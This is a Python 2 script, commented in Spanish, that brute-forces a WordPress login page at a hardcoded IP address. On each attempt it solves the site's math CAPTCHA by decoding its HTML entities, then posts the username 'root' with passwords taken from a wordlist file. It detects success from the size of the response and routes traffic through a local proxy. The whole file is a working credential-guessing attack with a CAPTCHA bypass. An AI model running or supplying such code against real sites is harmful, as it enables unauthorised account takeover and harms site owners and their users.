#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
import re
import urllib
import htmllib

def captcha(url):
    r=requests.get(url)
    if re.search('<p class="math-captcha-form">',r.text):
        captcha = r.text[r.text.find('<p class="math-captcha-form">'):r.text.find('<p class="forgetmenot">')]
        captcha = captcha[captcha.find('<span>')+len('<span>'):captcha.find('</span>')]
        captchaInp = captcha.find('<')
        captchaFin = captcha.rfind('/>')
        captcha = captcha.replace(captcha[captchaInp:captchaFin+2],'')

    operacion = captcha.split(' ')
    full = []
    for letras in operacion:
        if '&#x' in letras:
            letras = letras.replace('&#x','m0x').replace(';','m')
        if '&#' in letras:
            letras = letras.replace('&#','m').replace(';','m')
        full.append(letras)
    fin = []
    for i in full:
        let = i
        if 'm' in i:
            let = ''
            for j in i.split('m'):
                if '0x' in j:
                    j =  chr(int(j,16))
                    j = j.decode('iso-8859-1').encode('utf8')
                elif len(j)==2:
                    j = chr(int(j))
                    j = j.decode('iso-8859-1').encode('utf8')
                if j != '':
                    let += j
        fin.append(let)
    resultado = 0
    if fin[0] == '':
        #print 'x=%s-%s' %(fin[4],fin[2])
        resultado = int(fin[4])-int(fin[2])
    elif fin[2] == '':
        #print 'x=%s-%s'%(fin[4],fin[0])
        resultado = int(fin[4])-int(fin[0])
    elif fin[4] == '':
        #print '%s+%s=%i'%(fin[0],fin[2],int(fin[0])+int(fin[2]))
        resultado = int(fin[0])+int(fin[2])
    return resultado, r.cookies
s = requests.session
headers = {
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "http://167.99.232.57/wordpress/wp-login.php",
    "Content-Type": "application/x-www-form-urlencoded"
}

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url = "http://167.99.232.57/wordpress/wp-login.php"
correcta = ''
with open('pass.txt','r') as archivo:
    for password in archivo:
        resultado,cook = captcha(url)
        #print resultado
        data = {
            "log" : "root",
            "pwd" : password[:password.find('\n')],
            "mc-value" : resultado,
            "wp-submit":"Log+In",
            "redirect_to":"http://167.99.232.57/wordpress/wp-admin/",
            "testcookie":"1"
        }
        print 'Probando pass: %s' % password[:password.find('\n')]
        send = requests.post(url, headers=headers,data=data,cookies=cook)
        tamResp = int(send.headers['Content-Length'])
        if tamResp > 2000 and send.status_code == 200:
            correcta = password[:password.find('\n')]
            break
print 'La contrase√±a es: %s' % (correcta)
